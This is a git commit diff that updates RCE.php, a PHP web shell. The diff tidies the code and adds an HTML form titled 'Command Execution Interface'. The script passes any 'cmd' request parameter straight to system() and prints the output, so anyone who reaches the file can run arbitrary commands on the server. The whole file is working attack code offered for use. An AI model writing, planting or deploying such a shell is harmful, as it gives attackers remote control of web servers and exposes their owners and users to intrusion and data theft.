9f586c82029d92447a94ac12ecc01fc27acfdb5f
Prince Tyagi <106384548+prince2313@users.noreply.github.com>
2024-12-17 17:59:01 +0530

    Update RCE.php

--- RCE.php
+++ RCE.php
@@ -1,11 +1,25 @@
 <?php
-
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
+// PHP Logic: Executes system commands using $_REQUEST['cmd']
+if (isset($_REQUEST['cmd'])) {
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
 }
-
 ?>
+
+<!-- HTML Part -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Command Execution</title>
+</head>
+<body>
+    <h2>Command Execution Interface</h2>
+    <form method="GET" action="">
+        <input type="text" name="cmd" placeholder="Enter command" autofocus size="50">
+        <input type="submit" value="Execute">
+    </form>
+</body>
+</html>
